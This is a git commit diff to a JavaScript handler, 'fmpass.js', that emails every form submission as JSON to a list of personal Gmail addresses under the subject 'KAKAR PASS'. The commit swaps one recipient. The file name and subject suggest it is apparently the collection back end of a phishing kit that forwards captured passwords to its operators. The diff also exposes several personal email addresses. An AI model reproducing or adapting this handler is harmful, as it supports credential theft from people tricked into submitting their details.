6dbd42b73b9d954e1ebab212c9691fdcd23ec839
ejefkmnhhj-cmyk <ejefkmnhhj@gmail.com>
2026-03-08 12:20:36 +0500

    Update fmpass.js

--- fmpass.js
+++ fmpass.js
@@ -38,7 +38,7 @@ export default async function handler(req, res) {
     // ✅ Send email
     await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
-      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,officialjessica313@gmail.com",
+      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,officialdavid324455@gmail.com",
       subject: "KAKAR PASS",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
